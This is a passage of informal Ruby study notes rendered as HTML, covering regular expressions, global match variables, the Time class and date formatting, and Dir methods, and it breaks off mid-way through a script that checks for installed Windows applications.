    <tr>
      <td>[^]</td>
      <td>At least one of the character not in square brackets</td>
    </tr>
    <tr>
      <td>\d</td>
      <td>A digit. Same as [0-9] (0-9 means from 0 to 9)</td>
    </tr>
    <tr>
      <td>\D</td>
      <td>A non digit characters. Same as [^0-9]</td>
    </tr>
    <tr>
      <td>\s</td>
      <td>A white space</td>
    </tr>
    <tr>
      <td>\S</td>
      <td>A non whitespace</td>
    </tr>
    <tr>
      <td>\w</td>
      <td>A word character, same as [A-Za-z0-9]</td>
    </tr>
    <tr>
      <td>\W</td>
      <td>A non word character</td>
    </tr>
  </tbody>
</table>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"Hello World"</span> <span class="o">=~</span><span class="sr">/auh/</span> <span class="c1"># does not contain auh</span>
<span class="c1"># Output: nil </span>
<span class="s2">"Hello World"</span> <span class="o">=~</span><span class="sr">/[auh]/</span> <span class="c1"># does not contain 'a' 'u' or 'h'</span>
<span class="c1"># Output: nil</span>
<span class="s2">"Hello World"</span> <span class="o">=~</span><span class="sr">/[auh]/i</span> <span class="c1"># contain 'H' at index 0</span>
<span class="c1"># Output: 0</span>
<span class="s2">"Hello World"</span> <span class="o">=~</span><span class="sr">/[0-9]/</span>
<span class="c1"># Output: nil</span>
<span class="s2">"Hello World"</span> <span class="o">=~</span><span class="sr">/[\d]/</span>
<span class="c1"># Output: nil</span>
<span class="s2">"I'm 50"</span> <span class="o">=~</span><span class="sr">/[\s]/</span> <span class="c1"># whitespace at index 3</span>
<span class="c1"># Output: 3</span>
<span class="s2">"Hello World!"</span> <span class="o">=~</span><span class="sr">/[\W]/</span> <span class="c1"># '!' at index 10 - its a non word</span>
<span class="c1"># Output: 10</span>
</code></pre></div></div>

<h3 id="sequences">Sequences</h3>
<ul>
  <li>Is a concatenation of regular expression. The string must match the resulting concatenated pattern.</li>
</ul>

<table>
  <tbody>
    <tr>
      <td>Rule</td>
      <td>Matching</td>
    </tr>
    <tr>
      <td>xy</td>
      <td>Regular expression <strong>x</strong> followed by regular expression <strong>y</strong></td>
    </tr>
  </tbody>
</table>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"abc 123 abc "</span> <span class="o">=~</span><span class="sr">/\d\d\d\s/</span> <span class="c1"># 3 digit followed by a whitespace - matched at index 4</span>
<span class="c1"># Output: 4</span>
</code></pre></div></div>

<h3 id="alternatives">Alternatives</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span>  <span class="o">|</span>  <span class="n">pipe</span> <span class="n">character</span> <span class="p">)</span> <span class="n">are</span> <span class="n">used</span> <span class="n">to</span> <span class="n">specify</span> <span class="n">that</span> <span class="n">the</span> <span class="n">string</span> <span class="n">must</span> <span class="n">match</span> <span class="n">at</span> <span class="n">least</span> <span class="n">one</span> <span class="n">of</span> <span class="n">the</span> <span class="n">two</span> <span class="ow">or</span> <span class="n">more</span> <span class="n">regular</span> <span class="n">expressions</span><span class="o">.</span>
</code></pre></div></div>

<table>
  <tbody>
    <tr>
      <td>Rule</td>
      <td>Matching</td>
      <td> </td>
    </tr>
    <tr>
      <td>x</td>
      <td>y</td>
      <td>Either regular expression <strong>x</strong> or regular expression <strong>y</strong></td>
    </tr>
  </tbody>
</table>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"Hello World"</span> <span class="o">=~</span><span class="sr">/\s|\./</span> <span class="c1"># a whitespace or a point</span>
<span class="c1"># Output: 5</span>
<span class="s2">"Hello.World"</span> <span class="o">=~</span><span class="sr">/\s|\./</span> <span class="c1"># a whitespace or a point</span>
<span class="c1"># Output: 5</span>
</code></pre></div></div>

<h3 id="groups">Groups</h3>
<ul>
  <li>The specials characters <strong>(</strong> and <strong>)</strong> are used to group a regular expression into a unique syntactic unit</li>
</ul>

<table>
  <tbody>
    <tr>
      <td>Rule</td>
      <td>Matching</td>
    </tr>
    <tr>
      <td>(exp)</td>
      <td>exp is grouped as a single unit</td>
    </tr>
  </tbody>
</table>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"I'm Ruby"</span> <span class="o">=~</span><span class="sr">/Rub(y|ber)/</span>
<span class="c1"># Output: 4</span>
<span class="s2">"I'm Rubber"</span> <span class="o">=~</span><span class="sr">/Rub(y|ber)/</span>
<span class="c1"># Output: 4</span>
<span class="s2">"I'm Ruber"</span> <span class="o">=~</span><span class="sr">/Rub(y|ber)/</span> <span class="c1"># cause there is not ruber, only rubber</span>
<span class="c1"># Output: nil</span>
</code></pre></div></div>

<ul>
  <li>Groups are often used to capture more than one pattern inside a string</li>
  <li>With MatchData objects, we can get a description of these patterns: matched words, positions and much more.</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">reg</span> <span class="o">=</span> <span class="sr">/(Ruby).(Perl)/</span>
<span class="n">matching</span> <span class="o">=</span> <span class="n">reg</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="s2">"I like Ruby&amp;Perl"</span><span class="p">)</span>

<span class="n">matching</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="c1"># the entire matching</span>
<span class="c1"># Output: "Ruby&amp;Perl" </span>
<span class="n">matching</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># ruby word matching</span>
<span class="c1"># Output: "Ruby"</span>
<span class="n">matching</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="c1"># perl word matching</span>
<span class="c1"># Output: "Perl"</span>
<span class="n">matching</span><span class="p">.</span><span class="nf">begin</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># the entire matching index</span>
<span class="c1"># Output: 7</span>
<span class="n">matching</span><span class="p">.</span><span class="nf">begin</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># ruby word matching index</span>
<span class="c1"># Output: 7</span>
<span class="n">matching</span><span class="p">.</span><span class="nf">begin</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># perl word matching index</span>
<span class="c1"># Output: 12</span>
</code></pre></div></div>

<p>→ moreover = http://www.ruby-doc.org/core-1.9.3/MatchData.html</p>

<h3 id="repetitions">Repetitions</h3>

<table>
  <tbody>
    <tr>
      <td>Rule</td>
      <td>Matching</td>
    </tr>
    <tr>
      <td>exp*</td>
      <td>Zero or more occurrences of exp</td>
    </tr>
    <tr>
      <td>exp+</td>
      <td>One or more occurrences of exp</td>
    </tr>
    <tr>
      <td>exp?</td>
      <td>Zero or one occurrence of exp</td>
    </tr>
    <tr>
      <td>exp{n}</td>
      <td>n occurrences of exp (N is a natural number)</td>
    </tr>
    <tr>
      <td>exp{n,}</td>
      <td>n or more occurrences of exp</td>
    </tr>
    <tr>
      <td>exp{n,m}</td>
      <td>at least n and at most m occurrences of exp</td>
    </tr>
  </tbody>
</table>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"RubyRubyRuby"</span> <span class="o">=~</span><span class="sr">/(Ruby){3}
# Output: 0
"RubyRubyRuby" =~/</span><span class="p">(</span><span class="no">Ruby</span><span class="p">){</span><span class="mi">4</span><span class="p">}</span>
<span class="c1"># Output: nil</span>
</code></pre></div></div>

<h3 id="anchors">Anchors</h3>
<ul>
  <li>Are used to specify the position of the pattern matching.</li>
</ul>

<table>
  <tbody>
    <tr>
      <td>Rule</td>
      <td>Matching</td>
    </tr>
    <tr>
      <td>^exp</td>
      <td>exp must be at the begin of a line</td>
    </tr>
    <tr>
      <td>exp$</td>
      <td>exp must be at the end of a line</td>
    </tr>
    <tr>
      <td>\Aexp</td>
      <td>exp must be at the begin of the whole string</td>
    </tr>
    <tr>
      <td>exp\Z</td>
      <td>exp must be at the end of the whole string</td>
    </tr>
    <tr>
      <td>exp\z</td>
      <td>same as \Z but match newline too</td>
    </tr>
  </tbody>
</table>

<p>Examples:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"Hello World"</span> <span class="o">=~</span><span class="sr">/^Hello/</span>
<span class="c1"># Output: 0</span>
<span class="s2">"Hello World"</span> <span class="o">=~</span><span class="sr">/\AHello/</span>
<span class="c1"># Output: 0</span>
</code></pre></div></div>

<h3 id="a-real-world-example">A real world example</h3>
<ul>
  <li>Let us suppose u have a string that contains an IP address and we want to identify its position as well as extract its parts separated by dots (octet of the address).</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="sr">/(\d{1,3}).(\d{1,3}).(\d{1,3}).(\d{1,3})/</span>

<span class="n">ip_reg</span> <span class="o">=</span> <span class="sr">/(\d{1,3}).(\d{1,3}).(\d{1,3}).(\d{1,3})/</span>
<span class="n">my_ip</span> <span class="o">=</span> <span class="n">ip_reg</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="s2">"Some text... 192.168.1.1 other text ... "</span><span class="p">)</span>
<span class="n">my_ip</span><span class="p">.</span><span class="nf">to_a</span>
<span class="c1"># Output: ['192.168.1.1','192','168','1','1']</span>

</code></pre></div></div>

<ul>
  <li>the last example does not identify only IP, what if the string contains 999.999.999.999?</li>
  <li>There is a lot of standard and verified regular expressions that u can use according to your needs in the internet.</li>
</ul>

<h2 id="regular-expressoins-in-the-ruby-platform">Regular expressoins in the Ruby platform</h2>
<ul>
  <li>Global variables</li>
  <li>Working with string</li>
</ul>

<h3 id="global-variables-1">Global Variables</h3>

<table>
  <tbody>
    <tr>
      <td>Variable</td>
      <td>Description</td>
    </tr>
    <tr>
      <td>$~</td>
      <td>The MatchData object of the last match</td>
    </tr>
    <tr>
      <td>$&amp;</td>
      <td>The substring that matches the first group pattern</td>
    </tr>
    <tr>
      <td>$1</td>
      <td>The substring that matches the second group pattern</td>
    </tr>
    <tr>
      <td>$2, $3, etc</td>
      <td>And so on</td>
    </tr>
  </tbody>
</table>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="s2">"Hello World !!!"</span> <span class="o">=~</span><span class="sr">/^(hello)\s(world)\s(!!!)$/i</span>
<span class="c1"># Output: 0</span>
<span class="vg">$~</span>
<span class="c1"># Output: #matchdata "Hello World !!!"</span>

<span class="vg">$&amp;</span>
<span class="c1"># Output: "Hello World !!!"</span>
<span class="vg">$1</span>
<span class="c1"># Output: "Hello"</span>
<span class="vg">$2</span>
<span class="c1"># Output: World</span>
<span class="vg">$3</span>
<span class="c1"># Output: "!!!"</span>
<span class="vg">$~</span><span class="p">.</span><span class="nf">to_a</span>
<span class="c1"># Output: ["Hello World !!!", "Hello", "World", "!!!"]</span>

</code></pre></div></div>

<ul>
  <li>The most important is <strong>$~</strong> because all others are derived from it.</li>
</ul>

<h3 id="working-with-strings">Working with strings</h3>
<ul>
  <li>u can use regexp For all the methods seen in the Basic section: <strong>sub, gsub, split</strong> and more.</li>
  <li>method <strong>scan</strong></li>
  <li>allows u to iterate through more occurrences of the text matching in the pattern</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">text</span> <span class="o">=</span> <span class="s2">"abcas 192.168.1.2 textomtxo 192.168.4.20 more text"</span>
<span class="n">pattern</span> <span class="o">=</span> <span class="sr">/(?:\d{1,3}\.){3}(?:\d){1,3}/</span>
<span class="n">text</span><span class="p">.</span><span class="nf">scan</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">x</span><span class="o">|</span> <span class="nb">puts</span> <span class="n">x</span> <span class="p">}</span>
  <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.2</span>
  <span class="mf">192.168</span><span class="o">.</span><span class="mf">4.20</span>
</code></pre></div></div>

<blockquote>
  <p>(?:exp) = this syntax avoid capturing the subexpression inside ( ) so only the entire external expression is captured (the IP address)</p>
</blockquote>

<h2 id="dates-and-time">Dates and Time</h2>
<ul>
  <li>Time class</li>
  <li>Other classes</li>
</ul>

<h3 id="time-class">Time class</h3>
<ul>
  <li>Provides methods to work with your operating system date and time functionality.
 → http://www.ruby-doc.org/core-1.9.3/Time.html</li>
</ul>

<h3 id="create-a-time-instance">Create a time instance</h3>
<p>Current system time:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">TIme</span><span class="p">.</span><span class="nf">new</span>
</code></pre></div></div>

<p>Current time converted in utc:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Time</span><span class="p">.</span><span class="nf">new</span><span class="p">.</span><span class="nf">utc</span>
</code></pre></div></div>

<p>Time.local is a synonymous For Time.new:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Time</span><span class="p">.</span><span class="nf">local</span><span class="p">(</span><span class="mi">2014</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span>
<span class="c1"># Output: 2014-05-06 00:00:00 + 0200</span>
</code></pre></div></div>

<h3 id="components-of-a-time">Components of a time</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">t</span> <span class="o">=</span> <span class="no">TIme</span><span class="p">.</span><span class="nf">local</span><span class="p">(</span><span class="mi">2014</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">50</span><span class="p">)</span>
<span class="c1"># Output: 2014-01-13 11:50:00 +0100</span>
<span class="n">t</span><span class="p">.</span><span class="nf">year</span>
<span class="c1"># Output: 2014</span>
<span class="n">t</span><span class="p">.</span><span class="nf">month</span>
<span class="c1"># Output: 1</span>
<span class="n">t</span><span class="p">.</span><span class="nf">day</span>
<span class="c1"># Output: 13</span>
<span class="n">t</span><span class="p">.</span><span class="nf">hour</span>
<span class="c1"># Output: 11</span>
<span class="n">t</span><span class="p">.</span><span class="nf">yday</span>
<span class="c1"># Output: 13</span>
</code></pre></div></div>

<h3 id="predicates-and-conversions">Predicates and conversions</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">t</span> <span class="o">=</span> <span class="no">Time</span><span class="p">.</span><span class="nf">now</span>
<span class="c1"># Output: 2014-01-13 11:36:30 +0100</span>

<span class="n">t</span><span class="p">.</span><span class="nf">tuesday?</span>
<span class="c1"># Output: false</span>
<span class="n">t</span><span class="p">.</span><span class="nf">monday?</span>
<span class="c1"># Output: true</span>
<span class="n">t</span><span class="p">.</span><span class="nf">utc?</span>
<span class="c1"># Output: false</span>
</code></pre></div></div>

<p>Conversion between zone may be useful too:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">t</span> <span class="o">=</span> <span class="no">Time</span><span class="p">.</span><span class="nf">new</span><span class="p">.</span><span class="nf">utc</span>
<span class="c1"># Output: 2014-01-13 10:42:47 UTC</span>
<span class="n">t</span><span class="p">.</span><span class="nf">zone</span>
<span class="c1"># Output: "UTC"</span>
<span class="n">t</span><span class="p">.</span><span class="nf">localtime</span>
<span class="c1"># Output: 2014-01-13 11:42:47 +0100</span>
<span class="n">t</span><span class="p">.</span><span class="nf">zone</span>
<span class="c1"># Output: "CET"</span>

<span class="sr">//</span> <span class="n">timestamp</span>
<span class="n">t</span><span class="p">.</span><span class="nf">to_i</span>
<span class="c1"># Output: 1389610659</span>

<span class="sr">//</span> <span class="n">an</span> <span class="n">array</span>
<span class="n">t</span><span class="p">.</span><span class="nf">to_a</span>
<span class="c1"># Output: [39, 57, 11, 13, 1, 2014, 1, 13, false, "CET"]</span>

</code></pre></div></div>

<h3 id="arithmetic">Arithmetic</h3>
<p>Simple operations with time (+ and -) in order to add seconds to your time object:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">t</span> <span class="o">=</span> <span class="no">Time</span><span class="p">.</span><span class="nf">now</span>
<span class="c1"># Output: 2014-01-13 12:21:40 +0100</span>

<span class="n">t</span> <span class="o">+</span> <span class="mi">20</span> <span class="o">/</span><span class="sr">/add 20 seconds to t
t + 60*60 /</span><span class="o">/</span><span class="n">add</span> <span class="n">an</span> <span class="n">hour</span> <span class="n">to</span> <span class="n">t</span>
<span class="n">t</span> <span class="o">+</span> <span class="mi">6</span><span class="o">*</span><span class="p">(</span><span class="mi">60</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">24</span><span class="p">)</span> <span class="o">/</span><span class="sr">/ add 6 days to t

</span></code></pre></div></div>

<blockquote>
  <p>gem install -r active_support</p>
</blockquote>

<p>// this gem adds some useful methods when u work w time arithmetic</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'active_support/core_ext/numeric/time'</span>
 <span class="kp">true</span>

<span class="mi">10</span><span class="p">.</span><span class="nf">days</span>
<span class="c1"># Output: 864000</span>
<span class="n">t</span> <span class="o">=</span> <span class="no">TIme</span><span class="p">.</span><span class="nf">now</span>
	<span class="o">...</span>
<span class="n">t</span> <span class="o">+</span> <span class="mi">10</span><span class="p">.</span><span class="nf">days</span> <span class="c1"># add 10 days</span>
<span class="n">t</span> <span class="o">+</span> <span class="mi">1</span><span class="p">.</span><span class="nf">week</span> <span class="c1"># add 1 week</span>

</code></pre></div></div>

<blockquote>
  <p>if u do not want to install a gem, u can write your own version.</p>
</blockquote>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Numeric</span>
  <span class="k">def</span> <span class="nf">days</span><span class="p">;</span> <span class="nb">self</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">24</span><span class="p">;</span><span class="k">end</span>
<span class="k">end</span>

<span class="n">t</span> <span class="o">=</span> <span class="no">TIme</span><span class="p">.</span><span class="nf">now</span> <span class="c1"># grab current time</span>
<span class="n">t</span> <span class="o">+</span> <span class="mi">10</span><span class="p">.</span><span class="nf">days</span> <span class="c1"># add 10 days</span>
</code></pre></div></div>

<h3 id="comparisons">Comparisons</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">now</span> <span class="o">=</span> <span class="no">Time</span><span class="p">.</span><span class="nf">now</span>
<span class="n">before</span> <span class="o">=</span> <span class="n">now</span> <span class="o">-</span><span class="mi">50</span>
<span class="n">after</span> <span class="o">=</span> <span class="n">now</span> <span class="o">+</span><span class="mi">50</span>

<span class="n">now</span> <span class="o">&gt;</span> <span class="n">before</span>
<span class="c1"># Output: true</span>
<span class="n">after</span> <span class="o">&gt;</span> <span class="n">before</span>
<span class="c1"># Output: false</span>
<span class="n">before</span><span class="o">+</span><span class="mi">50</span><span class="o">==</span><span class="n">now</span>
<span class="c1"># Output: true</span>
</code></pre></div></div>

<h3 id="from-time-to-string">From time to string</h3>
<p>u can obtain a string with to_s or <strong>ctime</strong> method:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">t</span><span class="p">.</span><span class="nf">to_s</span>
<span class="n">t</span><span class="p">.</span><span class="nf">getutc</span><span class="p">.</span><span class="nf">to_s</span>
<span class="n">t</span><span class="p">.</span><span class="nf">ctime</span>
<span class="n">t</span><span class="p">.</span><span class="nf">getutc</span><span class="p">.</span><span class="nf">ctime</span>
</code></pre></div></div>

<ul>
  <li><strong>strftime</strong> method formats Time objects according to the directives in the given format string.</li>
</ul>

<p>Directives begin with the % character:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="no">Y</span> <span class="o">=</span> <span class="n">year</span>
<span class="o">%</span><span class="n">m</span> <span class="o">=</span> <span class="n">month</span>
<span class="o">%</span><span class="n">d</span> <span class="o">=</span> <span class="n">day</span>
<span class="n">etc</span>
</code></pre></div></div>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">t</span><span class="p">.</span><span class="nf">strftime</span><span class="p">(</span><span class="s2">"%Y/%m/%d"</span><span class="p">)</span>
  <span class="s2">"2014/01/14"</span>
<span class="n">t</span><span class="p">.</span><span class="nf">strftime</span><span class="p">(</span><span class="s2">"%H:%M:%S"</span><span class="p">)</span>
  <span class="s2">"10:33:22"</span>
</code></pre></div></div>

<p>There is combinations directives:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="n">c</span> <span class="o">=</span> <span class="n">date</span> <span class="ow">and</span> <span class="n">time</span>
<span class="o">%</span><span class="no">D</span> <span class="o">=</span> <span class="n">date</span>
<span class="o">%</span><span class="no">F</span> <span class="o">=</span> <span class="no">ISO</span> <span class="mi">8601</span>
<span class="sx">%r = </span><span class="mi">12</span><span class="n">hour</span> <span class="n">time</span>
<span class="o">%</span><span class="no">R</span> <span class="o">=</span> <span class="mi">24</span><span class="n">hour</span> <span class="n">time</span>
<span class="o">%</span><span class="no">T</span> <span class="o">=</span> <span class="mi">24</span> <span class="n">hour</span> <span class="n">time</span> <span class="n">with</span> <span class="n">seconds</span>
</code></pre></div></div>

<p>→ moreover = http://www.ruby-doc.org/core-1.9.3/Time.html</p>

<h3 id="other-classes">Other Classes</h3>
<ul>
  <li>Date = its used to manage date</li>
  <li>DateTime = its subclass of Data and it allows to manage time too</li>
</ul>

<blockquote>
  <p>both can be used like Time. But its slower</p>
</blockquote>

<h2 id="files-and-directories">Files and Directories</h2>
<ul>
  <li>Dir : For directories</li>
  <li>File : For files</li>
</ul>

<h3 id="dir">Dir</h3>
<ul>
  <li>dir class defines class methods that allows u to work with directories. It provides a variety of ways to list directories as well as their content. It can also be used to know where the Ruby script is executed or to navigate between file system directories.</li>
</ul>

<h3 id="current-directory">Current Directory</h3>
<ul>
  <li><strong>pwd</strong> and <strong>getwd</strong> class methods can be used to identify the current working directory.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Dir</span><span class="p">.</span><span class="nf">pwd</span>
<span class="c1"># Output: "/root/ruby"</span>
<span class="no">Dir</span><span class="p">.</span><span class="nf">getwd</span>
<span class="c1"># Output: "/root/ruby"</span>
</code></pre></div></div>

<ul>
  <li>The <strong>home</strong> method instead returns the home directory of the current user (or the home directory of the given user)</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Dir</span><span class="p">.</span><span class="nf">home</span>
<span class="c1"># Output: "/root"</span>
<span class="no">Dir</span><span class="p">.</span><span class="nf">home</span><span class="p">(</span><span class="s2">"root"</span><span class="p">)</span>
<span class="c1"># Output: "/root"</span>
<span class="no">Dir</span><span class="p">.</span><span class="nf">home</span><span class="p">(</span><span class="s2">"mark"</span><span class="p">)</span>
<span class="c1"># Output: "/home/mark"</span>
</code></pre></div></div>

<ul>
  <li>The <strong>chdir</strong> method can be used to change the current directory</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Dir</span><span class="p">.</span><span class="nf">pwd</span>
<span class="c1"># Output: "/root/ruby"</span>
<span class="no">Dir</span><span class="p">.</span><span class="nf">chdir</span><span class="p">(</span><span class="s2">"dir_example"</span><span class="p">)</span>
<span class="no">Dir</span><span class="p">.</span><span class="nf">pwd</span>
<span class="c1"># Output: "/root/ruby/dir_example"</span>
</code></pre></div></div>

<ul>
  <li>with chdir u can also use <strong>..</strong> (back to parent directory)</li>
  <li>u can use with blocks of code (loops)</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">puts</span> <span class="no">Dir</span><span class="p">.</span><span class="nf">pwd</span>
<span class="no">Dir</span><span class="p">.</span><span class="nf">chdir</span><span class="p">(</span><span class="s2">"nested_dir"</span><span class="p">)</span> <span class="k">do</span>
  <span class="nb">puts</span> <span class="no">Dir</span><span class="p">.</span><span class="nf">pwd</span>
<span class="k">end</span>
<span class="nb">puts</span> <span class="no">Dir</span><span class="p">.</span><span class="nf">pwd</span>
</code></pre></div></div>

<p>Output:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/root/</span><span class="n">ruby</span><span class="o">/</span><span class="n">dir_example</span>
<span class="sr">/root/</span><span class="n">ruby</span><span class="o">/</span><span class="n">dir_example</span>	<span class="sr">/nested_dir
/</span><span class="n">root</span><span class="o">/</span><span class="n">ruby</span><span class="o">/</span><span class="n">dir_example</span>
</code></pre></div></div>

<h3 id="creation--deletion">Creation / Deletion</h3>
<ul>
  <li><strong>mkdir</strong> method to create directories</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Dir</span><span class="p">.</span><span class="nf">mkdir</span><span class="p">(</span><span class="s2">"teste"</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li><strong>delete, rmdir,unlink</strong> to delete an existing directory</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Dir</span><span class="p">.</span><span class="nf">unlink</span> <span class="s2">"test"</span>
</code></pre></div></div>

<h1 id="directory-listings">Directory Listings</h1>
<ul>
  <li><strong>entries</strong> returns an array containing all files in the given directory</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Dir</span><span class="p">.</span><span class="nf">pwd</span>
<span class="c1"># Output: '/root/'</span>
<span class="no">Dir</span><span class="p">.</span><span class="nf">entries</span><span class="p">(</span><span class="s2">"."</span><span class="p">)</span> <span class="c1"># le dot means the current folder</span>
<span class="c1"># Output: ['chdir.rb', '.', '..', 'chdir-rb~', 'nested_dir', 'test']</span>
</code></pre></div></div>

<ul>
  <li>with a iterator we can use <strong>foreach</strong></li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Dir</span><span class="p">.</span><span class="nf">foreach</span><span class="p">(</span><span class="s2">"."</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">file</span><span class="o">|</span>
  <span class="nb">puts</span> <span class="n">file</span>
<span class="k">end</span>
</code></pre></div></div>

<ul>
  <li><strong>glob</strong> method or <strong>[]</strong> allows to search files and directories in the file system, according to a specific pattern.</li>
</ul>

<p>→ moreover = http://en.wikipedia.org/wiki/Glob_(programming)</p>

<p>Example to list all rb files in the directory:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Dir</span><span class="p">[</span><span class="s2">"*.rb"</span><span class="p">]</span>
<span class="no">Dir</span><span class="p">.</span><span class="nf">glob</span><span class="p">(</span><span class="s2">"*.rb"</span><span class="p">)</span>
</code></pre></div></div>

<p>→ moreover glob references - http://ruby-doc.org/core-1.9.3/Dir.html</p>

<h3 id="testing-directories">Testing Directories</h3>
<ul>
  <li><strong>Exist?</strong> and <strong>exists?</strong> can be used to test if the specified path is a directory</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Dir</span><span class="p">.</span><span class="nf">exist?</span> <span class="s2">"/path"</span>
<span class="no">Dir</span><span class="p">.</span><span class="nf">exists?</span> <span class="s2">"/path"</span>
</code></pre></div></div>

<h3 id="dir-objects">Dir Objects</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dir</span> <span class="o">=</span> <span class="no">Dir</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"dir_example"</span><span class="p">)</span>
<span class="n">dir</span><span class="p">.</span><span class="nf">each</span> <span class="p">{</span><span class="o">|</span><span class="n">x</span><span class="o">|</span> <span class="nb">puts</span> <span class="n">x</span><span class="p">}</span>
<span class="sr">//i</span><span class="n">t</span> <span class="n">will</span> <span class="n">list</span> <span class="n">all</span> <span class="n">files</span>
</code></pre></div></div>

<h3 id="windows-application-directory-listing-example">Windows Application Directory Listing Example</h3>
<ul>
  <li>check if an application is installed on a Windows machine and if its, it tries to list the content of the directory.</li>
</ul>

<p>Usually Windows applications are installed in the following directories:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="err">→</span> <span class="no">C</span><span class="p">:\</span><span class="no">Program</span> <span class="no">Files</span>
<span class="err">→</span> <span class="no">C</span><span class="p">:\</span><span class="no">Program</span> <span class="no">Files</span> <span class="p">(</span><span class="n">x86</span><span class="p">)</span>
<span class="err">→</span> <span class="no">C</span><span class="p">:\</span>

<span class="n">directories</span> <span class="o">=</span> <span class="p">[</span>
<span class="s1">'C:\\Program Files\\'</span><span class="p">,</span>
<span class="s1">'C:\\Program Files (x86)\\'</span><span class="p">,</span>
<span class="s1">'C:\\'</span>
<span class="p">]</span>

<span class="n">installed</span> <span class="o">=</span> <span class="kp">false</span>
<span class="p">\</span><span class="k">for</span> <span class="n">dir</span> <span class="k">in</span> <span class="n">directories</span> <span class="k">do</span>
<span class="n">dir</span> <span class="o">=</span> <span class="n">dir</span> <span class="o">+</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="k">if</span> <span class="no">Dir</span><span class="p">.</span><span class="nf">exist?</span> <span class="n">dir</span> <span class="k">then</span>
  <span class="n">installed</span> <span class="o">=</span> <span class="kp">true</span><span class="p">;</span>
  <span class="nb">puts</span> <span class="sx">%Q!"</span><span class="si">#{</span><span class="n">dir</span><span class="si">}</span><span class="sx">" exists!</span>
  <span class="nb">puts</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Listing: "</span>
